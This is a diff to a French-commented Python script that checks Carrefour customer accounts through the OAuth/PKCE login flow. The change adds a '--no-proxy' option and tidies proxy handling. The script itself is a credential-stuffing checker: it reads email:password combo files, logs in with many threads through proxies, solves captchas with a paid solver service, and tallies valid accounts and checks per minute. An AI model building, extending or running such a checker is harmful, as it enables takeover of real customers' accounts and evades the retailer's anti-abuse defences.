@@ -9,6 +9,8 @@ Mode interactif : invites avec défauts entre crochets (Entrée = défaut).
 
 En cas d'erreur : exception FlowError avec corps HTTP (SOURCE) ; mode liste affiche SOURCE pour erreurs et pour
 réponses RETRY / CUSTOM / UNKNOWN.
+
+Sans proxy : `--no-proxy`, ou `PROXY_URL=` vide, ou à l'invite taper `-` / `none`.
 """
 
 from __future__ import annotations
@@ -486,6 +488,30 @@ class RunStats:
             return self.valid, self.invalid, self.error, self._done, self._done / max(time.monotonic() - self._start, 1e-6) * 60.0
 
 
+def _normalize_proxy_url(s: str | None) -> str | None:
+    """Retourne None si pas de proxy ; URL sinon (http/https)."""
+    if s is None:
+        return None
+    t = s.strip()
+    if t in ("", "-", "none", "non", "0"):
+        return None
+    if not t.lower().startswith("http"):
+        print("Le proxy doit commencer par http:// ou https:// (ou utilisez --no-proxy / -)", file=sys.stderr)
+        raise SystemExit(2)
+    return t
+
+
+def _env_proxy_tri_state() -> Any:
+    """Absent du environnement → sentinel _PROXY_ENV_UNSET ; vide → None (sans proxy) ; sinon URL."""
+    if "PROXY_URL" not in os.environ:
+        return _PROXY_ENV_UNSET
+    v = os.environ["PROXY_URL"].strip()
+    return None if v == "" else v
+
+
+_PROXY_ENV_UNSET = object()
+
+
 def _prompt_nonempty(label: str, secret: bool = False, default: str | None = None) -> str:
     hint = f" [{default}]" if default else ""
     while True:
@@ -634,7 +660,12 @@ def classify_login_response(source: str) -> str:
 def main() -> None:
     parser = argparse.ArgumentParser(description="Carrefour OAuth / PKCE check flow (batch ou un compte).")
     parser.add_argument("--combo-file", help="Fichier email:motdepasse (une ligne par compte)")
-    parser.add_argument("--proxy", help="Proxy http://user:pass@host:port")
+    parser.add_argument("--proxy", help="Proxy http://user:pass@host:port (ou '-' pour désactiver)")
+    parser.add_argument(
+        "--no-proxy",
+        action="store_true",
+        help="Ne pas utiliser de proxy (prioritaire sur --proxy et PROXY_URL)",
+    )
     parser.add_argument("--solver-key", help="Clé API Solverify (captcha)")
     parser.add_argument("--threads", type=int, default=0, help="Nombre de threads (0 = demandé si mode liste)")
     parser.add_argument("--forward-url", help="Forwarder local optionnel (ex: http://127.0.0.1:5000)")
@@ -650,7 +681,7 @@ def main() -> None:
     env_solver = os.environ.get("SOLVERIFY_KEY", "").strip()
     env_user = os.environ.get("CARREFOUR_USER", "").strip()
     env_pass = os.environ.get("CARREFOUR_PASS", "").strip()
-    env_proxy = os.environ.get("PROXY_URL", "").strip() or None
+    env_proxy_raw = _env_proxy_tri_state()
 
     is_tty = sys.stdin.isatty() and sys.stdout.isatty()
     batch_mode = bool(args.combo_file) or (is_tty and not args.single)
@@ -666,19 +697,21 @@ def main() -> None:
             else:
                 combo_path = DEFAULT_COMBO_FILE
 
-        proxy_url = args.proxy or env_proxy
-        if not proxy_url:
+        if args.no_proxy:
+            proxy_url = None
+        elif args.proxy is not None:
+            proxy_url = _normalize_proxy_url(args.proxy)
+        elif env_proxy_raw is not _PROXY_ENV_UNSET:
+            proxy_url = _normalize_proxy_url(env_proxy_raw)
+        else:
             if is_tty:
-                proxy_url = _prompt_nonempty(
-                    "Proxy (http://user:pass@host:port)",
+                proxy_raw = _prompt_nonempty(
+                    "Proxy (http://… ; '-' = aucun)",
                     default=DEFAULT_PROXY_URL,
                 )
+                proxy_url = _normalize_proxy_url(proxy_raw)
             else:
-                proxy_url = DEFAULT_PROXY_URL
-        proxy_url = proxy_url.strip()
-        if not proxy_url.lower().startswith("http"):
-            print("Le proxy doit commencer par http:// ou https://", file=sys.stderr)
-            raise SystemExit(2)
+                proxy_url = _normalize_proxy_url(DEFAULT_PROXY_URL)
 
         solver_key = (args.solver_key or env_solver or "").strip()
         if not solver_key:
@@ -695,7 +728,10 @@ def main() -> None:
         combos = load_combos(combo_path)
         if not combos:
             raise SystemExit(f"Aucune ligne valide dans {combo_path}")
-        print(f"Chargé {len(combos)} combo(s), {max_workers} thread(s).", flush=True)
+        print(
+            f"Chargé {len(combos)} combo(s), {max_workers} thread(s), proxy={'aucun' if proxy_url is None else 'oui'}.",
+            flush=True,
+        )
         stats = run_checker(
             combos,
             proxy_url=proxy_url,
@@ -707,7 +743,14 @@ def main() -> None:
         print(f"Terminé — valid={v} invalid={inv} error={err} total={done} cpm={cpm:.1f}")
         return
 
-    proxy_url = (args.proxy or env_proxy or DEFAULT_PROXY_URL).strip() if (args.proxy or env_proxy or DEFAULT_PROXY_URL) else None
+    if args.no_proxy:
+        proxy_url = None
+    elif args.proxy is not None:
+        proxy_url = _normalize_proxy_url(args.proxy)
+    elif env_proxy_raw is not _PROXY_ENV_UNSET:
+        proxy_url = _normalize_proxy_url(env_proxy_raw)
+    else:
+        proxy_url = _normalize_proxy_url(DEFAULT_PROXY_URL)
     solver_key = (args.solver_key or env_solver or DEFAULT_SOLVERIFY_KEY).strip()
     user = env_user
     password = env_pass
